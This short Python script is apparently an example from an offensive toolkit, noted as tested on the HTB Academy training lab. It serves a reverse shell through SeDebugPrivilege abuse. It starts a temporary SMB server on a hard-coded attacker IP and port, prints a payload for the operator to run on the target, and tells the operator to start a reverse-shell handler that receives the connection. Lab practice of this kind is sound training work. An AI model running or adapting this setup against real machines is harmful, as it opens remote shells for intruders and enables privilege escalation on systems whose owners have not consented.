# This example can be used for SeDebugPrivileged users
# Tested on HTB Academy

from payload import SillyPythonPayload
from silly_python_payloads import reverse_shell_handerl_file
from tempsmbserver import TempSMB

local_ip = "10.10.16.101"
local_port = 42069

with TempSMB(local_ip=local_ip, set_credentials=False, smb2=True) as smb:
    """currently doesnt work with authentication... I really need to refactor this shit...."""
    silly_payload = SillyPythonPayload(smb, local_port)
    print("Run python on the target as a treat")
    print(silly_payload)
    print("RUN REVERSE SHELL HANDLER IN DIFFERENT INTERPRETER")
    print(f"python {reverse_shell_handerl_file}")
    while True:
        import time
        time.sleep(1)